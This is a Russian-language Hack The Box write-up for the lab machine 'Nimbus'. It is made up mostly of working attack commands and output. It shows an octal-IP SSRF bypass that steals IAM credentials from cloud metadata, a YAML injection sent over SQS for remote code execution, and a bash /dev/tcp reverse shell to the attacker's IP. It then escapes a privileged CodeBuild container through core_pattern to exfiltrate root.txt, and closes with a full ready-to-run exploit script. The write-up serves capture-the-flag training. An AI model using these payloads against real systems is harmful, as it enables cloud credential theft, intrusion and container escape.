# HTB Nimbus — Full Writeup

**Машина:** Nimbus  
**Сложность:** Hard  
**ОС:** Linux (Ubuntu)  
**IP:** 10.129.245.218  
**Дата:** 15.10.2026

---

## Содержание

1. [Reconnaissance](#1-reconnaissance)
2. [SSRF — кража IAM-кред](#2-ssrf--кража-iam-кред)
3. [LocalStack — разведка SQS](#3-localstack--разведка-sqs)
4. [SQS Injection → RCE](#4-sqs-injection--rce)
5. [Reverse Shell](#5-reverse-shell)
6. [user.txt](#6-usertxt)
7. [Разведка внутри воркера](#7-разведка-внутри-воркера)
8. [CodeBuild — привилегированный контейнер](#8-codebuild--привилегированный-контейнер)
9. [Побег через core_pattern + /dev/tcp](#9-побег-через-core_pattern--devtcp)
10. [root.txt](#10-roottxt)
11. [Итоги](#11-итоги)

---

## 1. Reconnaissance

### 1.1. Nmap

```bash
nmap -sC -sV -p- 10.129.245.218 -oN nmap_full.txt
```

**Результат:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nimbus.htb/
```

**Вывод:** открыты SSH и HTTP. Nginx редиректит на `nimbus.htb` → нужна запись в `/etc/hosts`.

### 1.2. Настройка hosts

```bash
sudo tee -a /etc/hosts <<EOF
10.129.245.218  nimbus.htb aws.nimbus.htb floci
EOF
```

### 1.3. Веб-приложение

```bash
curl http://nimbus.htb/
```

**Результат:** интерфейс **Nimbus — Internal Job Scheduler**. Ссылки:
- `/jobs` — Submit Job
- `/login` — Sign In
- `/jobs/preview` — Preview (SSRF-эндпоинт)
- `/api/v1/health`
- `/docs`

**Ключевые зацепки из HTML:**
- «Drop the YAML in our internal Git, then point the **job submitter** at the raw URL»
- «Nimbus runs scheduled and on-demand background jobs across our **worker fleet**»
- Упоминается `marcus` (DevOps lead)

### 1.4. Проверка SSRF

```bash
curl -X POST http://nimbus.htb/jobs/preview -d "url=http://example.com"
```

**Результат:** `Error: URL must point to a YAML file (must end in .yaml or .yml)`

**Вывод:** эндпоинт `/jobs/preview` делает запрос по URL и возвращает содержимое. Есть фильтр на `.yaml`.

---

## 2. SSRF — кража IAM-кред

### 2.1. Попытка обратиться к IMDS

```bash
curl -X POST http://nimbus.htb/jobs/preview \
  --data-urlencode "url=http://169.254.169.254/latest/meta-data/?a=test.yaml"
```

**Результат:** блокировка (фильтр на `169.254.169.254`).

### 2.2. Обход фильтра через octal IP

`169.254.169.254` в octal = `0251.0376.0251.0376`

```bash
curl -X POST http://nimbus.htb/jobs/preview \
  --data-urlencode "url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?a=test.yaml"
```

**Результат (HTTP 200):**

```json
{
  "Code": "Success",
  "LastUpdated": "2026-10-15T12:58:10Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
  "Token": "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM",
  "Expiration": "2026-10-15T18:58:10Z"
}
```

**IAM-креды получены.** Роль: `nimbus-web-role`. Действительны до 18:58 UTC.

### 2.3. Экспорт кред

```bash
export AWS_ACCESS_KEY_ID="ASIAQX4PG7L2K9M3N5R8"
export AWS_SECRET_ACCESS_KEY="bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM"
export AWS_DEFAULT_REGION="us-east-1"
```

---

## 3. LocalStack — разведка SQS

### 3.1. Проверка identity

```bash
aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity
```

### 3.2. Список очередей

```bash
aws --endpoint-url http://aws.nimbus.htb sqs list-queues
```

**Результат:**

```json
{
    "QueueUrls": [
        "http://floci:4566/847219365028/nimbus-jobs"
    ]
}
```

**Вывод:** очередь `nimbus-jobs`, account ID `847219365028`. URL очереди — `http://floci:4566/...` (внутренний LocalStack).

### 3.3. Важное замечание

`floci:4566` **не резолвится** с атакующей машины (только 22 и 80 открыты). Используем `aws.nimbus.htb` как endpoint:

```bash
aws --endpoint-url http://aws.nimbus.htb sqs send-message \
  --queue-url http://aws.nimbus.htb/847219365028/nimbus-jobs \
  --message-body '...'
```

---

## 4. SQS Injection → RCE

### 4.1. Анализ `worker.py`

`worker.py` доступен через S3 (`nimbus-dev-artifacts/source/worker.py`) и локально в контейнере. Ключевой фрагмент:

```python
job = yaml.load(body, Loader=yaml.Loader)  # vulnerable
...
script = job.get("script", "")
...
result = subprocess.run(["python3", "-c", script], ...)
```

**Уязвимость:** `yaml.load` с `Loader=yaml.Loader` + выполнение поля `script` через `python3 -c`.

### 4.2. Проверка RCE

Запускаем listener:

```bash
python3 -m http.server 8000
```

Отправляем сообщение:

```bash
aws --endpoint-url http://aws.nimbus.htb sqs send-message \
  --queue-url http://aws.nimbus.htb/847219365028/nimbus-jobs \
  --message-body 'name: test
script: import os; os.system("curl http://10.10.14.215:8000/test")'
```

**Результат в логах listener:**

```
10.129.245.218 - - [15/Oct/2026 16:18:50] "GET /test HTTP/1.1" 200 -
```

**RCE подтверждён.**

---

## 5. Reverse Shell

### 5.1. Listener

```bash
nc -lvnp 4444
```

### 5.2. Payload

```bash
aws --endpoint-url http://aws.nimbus.htb sqs send-message \
  --queue-url http://aws.nimbus.htb/847219365028/nimbus-jobs \
  --message-body 'name: shell
script: import os; os.system("bash -c \"bash -i >& /dev/tcp/10.10.14.215/4444 0>&1\"")'
```

### 5.3. Результат

```
connect to [10.10.14.215] from (UNKNOWN) [10.129.245.218] 52378
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
worker@2d5970963b8f:/app$
```

**Мы внутри контейнера воркера как `worker`.**

---

## 6. user.txt

```bash
cat /home/worker/user.txt
```

**Результат:**

```
075652eac53f97fc0c98a3dc5d3c7a2f
```

**user.txt = `075652eac53f97fc0c98a3dc5d3c7a2f`**

---

## 7. Разведка внутри воркера

### 7.1. Базовая информация

```bash
id
hostname
ls -la /
env | grep -i aws
cat /etc/hosts
```

**Результат:**

```
uid=1000(worker) gid=1000(worker) groups=1000(worker)
2d5970963b8f

AWS_DEFAULT_REGION=us-east-1
AWS_SECRET_ACCESS_KEY=dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh
QUEUE_URL=http://aws.nimbus.htb/847219365028/nimbus-jobs
AWS_ACCESS_KEY_ID=AKIA7P3R9X4K8M2L5VHN
AWS_ENDPOINT_URL=http://aws.nimbus.htb
```

### 7.2. Доступ к LocalStack

```bash
curl -s http://floci:4566/_localstack/health
```

**Результат:** LocalStack 1.5.17, CodeBuild **running**, SQS running, S3 running.

### 7.3. Core pattern и overlay

```bash
cat /proc/sys/kernel/core_pattern
sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1
```

**Результат:**

```
|/usr/share/apport/apport -p%p -s%s ...
/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/166/fs
```

### 7.4. Проверка LocalStack-сервисов

```bash
export AWS_ACCESS_KEY_ID=AKIA7P3R9X4K8M2L5VHN
export AWS_SECRET_ACCESS_KEY=dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh
EP=http://floci:4566

aws --endpoint-url $EP s3api list-buckets
aws --endpoint-url $EP ssm describe-parameters
aws --endpoint-url $EP secretsmanager list-secrets
aws --endpoint-url $EP lambda list-functions
aws --endpoint-url $EP ecs list-clusters
```

**Результат:**
- S3: `nimbus-dev-artifacts` (только `source/worker.py`)
- SSM, Secrets, Lambda, ECS, ECR, DynamoDB, SNS — **пусто**

**Вывод:** флаг не в LocalStack, нужен побег на хост.

---

## 8. CodeBuild — привилегированный контейнер

### 8.1. Создание IAM-роли

```bash
python3 - <<'PY'
import boto3, json, os
EP = "http://floci:4566"
CREDS = dict(aws_access_key_id=os.environ["AWS_ACCESS_KEY_ID"],
             aws_secret_access_key=os.environ["AWS_SECRET_ACCESS_KEY"],
             region_name="us-east-1")
iam = boto3.client("iam", endpoint_url=EP, **CREDS)
trust = {"Version":"2012-10-17","Statement":[{"Effect":"Allow",
         "Principal":{"Service":"codebuild.amazonaws.com"},"Action":"sts:AssumeRole"}]}
try:
    r = iam.create_role(RoleName="codebuild-role", AssumeRolePolicyDocument=json.dumps(trust))
    print("[+] role created:", r["Role"]["Arn"])
except Exception as e:
    print("[!]", e)
print("roles:", [r["RoleName"] for r in iam.list_roles()["Roles"]])
PY
```

**Результат:**

```
codebuild-role -> arn:aws:iam::847219365028:role/codebuild-role
```

**Важно:** account ID = `847219365028` (не `000000000000`).

### 8.2. Проверка CodeBuild

```bash
python3 - <<'PY'
import boto3, os
EP="http://floci:4566"
CREDS=dict(aws_access_key_id=os.environ["AWS_ACCESS_KEY_ID"],
           aws_secret_access_key=os.environ["AWS_SECRET_ACCESS_KEY"],
           region_name="us-east-1")
c=boto3.client("codebuild", endpoint_url=EP, **CREDS)
print("projects:", c.list_projects())
PY
```

### 8.3. Создание проекта с privilegedMode

```bash
cat > /tmp/escape.py <<'PY'
import boto3, base64, time, os

EP = "http://floci:4566"
CREDS = dict(aws_access_key_id=os.environ.get("AWS_ACCESS_KEY_ID","test"),
             aws_secret_access_key=os.environ.get("AWS_SECRET_ACCESS_KEY","test"),
             region_name="us-east-1")
CB = boto3.client("codebuild", endpoint_url=EP, **CREDS)

ESCAPE = r'''#!/bin/bash
echo "=== setting core_pattern ==="
echo "|/bin/bash -c cat</root/root.txt>/dev/tcp/10.10.14.215/5555" > /proc/sys/kernel/core_pattern
cat /proc/sys/kernel/core_pattern

echo "=== crash 1 ==="
ulimit -c unlimited
bash -c 'kill -11 $$' || true
sleep 2

echo "=== crash 2 (python) ==="
python3 -c 'import ctypes; ctypes.string_at(0)' 2>/dev/null || true
sleep 2

echo "=== crash 3 (sleep + kill) ==="
sleep 1 &
SPID=$!
kill -SEGV $SPID 2>/dev/null || true
sleep 2
'''

BUILDSPEC = """version: 0.2
phases:
  build:
    commands:
      - echo "$S_B64" | base64 -d > /tmp/s.sh
      - chmod +x /tmp/s.sh
      - /tmp/s.sh 2>&1 | tee /tmp/o.txt || true
      - cat /tmp/o.txt
      - exit 1
"""

try: CB.delete_project(name="devtcp")
except: pass

CB.create_project(
    name="devtcp",
    source={"type":"NO_SOURCE","buildspec":BUILDSPEC},
    artifacts={"type":"NO_ARTIFACTS"},
    environment={
        "type":"LINUX_CONTAINER",
        "image":"floci/floci:latest",
        "computeType":"BUILD_GENERAL1_SMALL",
        "privilegedMode":True,
        "environmentVariables":[
            {"name":"BASH_FUNC_id%%","value":"() { echo uid=1000; }","type":"PLAINTEXT"},
        ],
    },
    serviceRole="arn:aws:iam::847219365028:role/codebuild-role",
)
print("[+] project created")

r=CB.start_build(
    projectName="devtcp",
    environmentVariablesOverride=[
        {"name":"BASH_FUNC_id%%","value":"() { echo uid=1000; }","type":"PLAINTEXT"},
        {"name":"S_B64","value":base64.b64encode(ESCAPE.encode()).decode(),"type":"PLAINTEXT"},
    ])
bid=r["build"]["id"]
print("[+] build:", bid)
for _ in range(40):
    time.sleep(3)
    b=CB.batch_get_builds(ids=[bid])["builds"][0]
    print("[*]", b["buildStatus"], "|", b.get("currentPhase"))
    if b["buildStatus"] in ("SUCCEEDED","FAILED","FAULT","STOPPED","TIMED_OUT"): break
for ph in b.get("phases", []):
    for ctx in ph.get("contexts", []):
        print(ctx.get("message","")[:6000])
PY
```

### 8.4. Обход UID-drop через BASH_FUNC_id%%

```python
environmentVariables=[
    {"name":"BASH_FUNC_id%%","value":"() { echo uid=1000; }","type":"PLAINTEXT"},
]
```

**Как это работает:**
- Entrypoint контейнера `floci/floci:latest` вызывает `id`
- Если UID=0 → дропает права
- Переменная `BASH_FUNC_id%%` экспортирует bash-функцию `id()`, которая возвращает `uid=1000`
- Entrypoint думает, что UID=1000 → **не дропает права**
- Контейнер остаётся **root**

---

## 9. Побег через core_pattern + /dev/tcp

### 9.1. Listener

В **отдельном терминале**:

```bash
nc -lvnp 5555
```

### 9.2. Запуск эксплойта

```bash
python3 /tmp/escape.py
```

### 9.3. Результат

**Билд:**

```
[+] project created
[+] build: devtcp:1
[*] IN_PROGRESS | DOWNLOAD_SOURCE
[*] IN_PROGRESS | BUILD
[*] FAILED | COMPLETED
Exit code 1: tion fault      (core dumped) bash -c 'kill -11 $$'
=== setting core_pattern ===
core_pattern:
|/bin/bash -c cat</root/root.txt>/dev/tcp/10.10.14.215/5555
=== crash 1 ===
/tmp/s.sh: line 8:    20 Segmentation fault      (core dumped) bash -c 'kill -11 $$'
=== crash 2 (python) ===
=== crash 3 (sleep + kill) ===
/tmp/s.sh: line 19:    31 Segmentation fault      (core dumped) sleep 1
```

**На listener:**

```
connect to [10.10.14.215] from (UNKNOWN) [10.129.245.218] 59896
25b67f1433154b312415cedb3e584264
```

---

## 10. root.txt

**root.txt = `25b67f1433154b312415cedb3e584264`**

---

## 11. Итоги

### 11.1. Флаги

| Флаг | Значение |
|------|----------|
| user.txt | `075652eac53f97fc0c98a3dc5d3c7a2f` |
| root.txt | `25b67f1433154b312415cedb3e584264` |

### 11.2. Полная цепочка

| # | Шаг | Техника |
|---|-----|---------|
| 1 | Recon | Nmap → 22, 80 |
| 2 | SSRF bypass | Octal IP `0251.0376.0251.0376` + `?a=test.yaml` |
| 3 | Cred theft | IMDS `/latest/meta-data/iam/security-credentials/nimbus-web-role` |
| 4 | SQS enumeration | `aws sqs list-queues` через `aws.nimbus.htb` |
| 5 | RCE | SQS message с YAML `script: import os; os.system(...)` |
| 6 | Reverse shell | `bash -i >& /dev/tcp/10.10.14.215/4444 0>&1` |
| 7 | user.txt | `/home/worker/user.txt` |
| 8 | CodeBuild | `create_project` с `privilegedMode: True` |
| 9 | UID-drop bypass | `BASH_FUNC_id%%` = `() { echo uid=1000; }` |
| 10 | Container escape | `core_pattern` = `\|/bin/bash -c cat</root/root.txt>/dev/tcp/...` |
| 11 | root.txt | Флаг на listener через TCP |

### 11.3. Ключевые уязвимости

1. **SSRF + слабый фильтр** — обход через octal IP
2. **Небезопасный `yaml.load`** — RCE через `Loader=yaml.Loader`
3. **Privileged CodeBuild** — `privilegedMode: True` даёт CAP_SYS_ADMIN
4. **core_pattern usermode-helper** — выполнение команд ядром в хостовом namespace
5. **BASH_FUNC_id%%** — обход entrypoint, проверяющего UID

### 11.4. Почему сработал `/dev/tcp`

- **Нет файла-helper'а** → не нужен доступ к хостовой ФС
- **Нет пробелов в команде** → ядро не режет на аргументы
- **`/bin/bash`** есть на хосте (Ubuntu)
- **`/dev/tcp`** — встроенная фича bash
- **Ядро единое** для хоста и контейнера → helper выполняется в хостовом namespace

---

## Приложение A. Полный скрипт эксплуатации

```bash
#!/bin/bash
# nimbus_exploit.sh — полный эксплойт HTB Nimbus
# Использование: ./nimbus_exploit.sh <TARGET_IP> <YOUR_VPN_IP>

TARGET=$1
VPN_IP=$2

if [ -z "$TARGET" ] || [ -z "$VPN_IP" ]; then
    echo "Usage: $0 <TARGET_IP> <YOUR_VPN_IP>"
    exit 1
fi

# 1. Настройка hosts
echo "[*] Adding hosts entries..."
sudo tee -a /etc/hosts <<EOF
$TARGET  nimbus.htb aws.nimbus.htb floci
EOF

# 2. Кража IAM-кред через SSRF
echo "[*] Stealing IAM credentials via SSRF..."
CREDS=$(curl -s -X POST http://nimbus.htb/jobs/preview \
  --data-urlencode "url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?a=test.yaml")

export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | grep -oP 'AccessKeyId[^,]+' | cut -d'"' -f4)
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | grep -oP 'SecretAccessKey[^,]+' | cut -d'"' -f4)
export AWS_SESSION_TOKEN=$(echo "$CREDS" | grep -oP 'Token[^,]+' | cut -d'"' -f4)
export AWS_DEFAULT_REGION=us-east-1

echo "[+] AccessKeyId: $AWS_ACCESS_KEY_ID"
echo "[+] SecretAccessKey: $AWS_SECRET_ACCESS_KEY"

# 3. Listener для reverse shell
echo "[*] Starting listener on port 4444..."
nc -lvnp 4444 &
NC_PID=$!
sleep 1

# 4. Reverse shell через SQS
echo "[*] Sending reverse shell payload to SQS..."
aws --endpoint-url http://aws.nimbus.htb sqs send-message \
  --queue-url http://aws.nimbus.htb/847219365028/nimbus-jobs \
  --message-body "name: shell
script: import os; os.system(\"bash -c 'bash -i >& /dev/tcp/$VPN_IP/4444 0>&1'\")"

echo "[*] Reverse shell should connect shortly..."
wait $NC_PID
```

---

## Приложение B. Полезные команды

```bash
# Проверка IAM-кред
aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity

# Список очередей
aws --endpoint-url http://aws.nimbus.htb sqs list-queues

# Отправка сообщения в SQS
aws --endpoint-url http://aws.nimbus.htb sqs send-message \
  --queue-url http://aws.nimbus.htb/847219365028/nimbus-jobs \
  --message-body 'name: test
script: import os; os.system("id")'

# Скачивание worker.py из S3
aws --endpoint-url http://floci:4566 s3 cp \
  s3://nimbus-dev-artifacts/source/worker.py /tmp/worker.py

# Проверка LocalStack health
curl -s http://floci:4566/_localstack/health | python3 -m json.tool

# Список CodeBuild проектов
aws --endpoint-url http://floci:4566 codebuild list-projects

# Список IAM ролей
aws --endpoint-url http://floci:4566 iam list-roles
```

---

**Удачи!** 🏆
